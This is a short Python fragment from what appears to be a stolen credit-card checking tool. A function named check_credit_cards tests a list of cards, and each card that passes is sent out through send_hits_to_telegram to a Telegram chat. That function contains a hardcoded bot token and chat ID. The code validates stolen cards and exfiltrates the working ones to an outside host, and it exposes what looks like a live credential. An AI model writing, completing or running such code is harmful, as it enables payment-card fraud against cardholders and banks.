...
def send_hits_to_telegram(card):
    telegram_token = "8122009466:AAFh9h46K-JUhUJfO0NBU6giRXjZPIJ0hMo"  # Replace with your actual bot token
    telegram_chat_id = "7593550190"           # Replace with your actual chat ID
...
def check_credit_cards(cc_list,sessions):
    ...
    send_hits_to_telegram(card)  # Add this line
    hit += 1
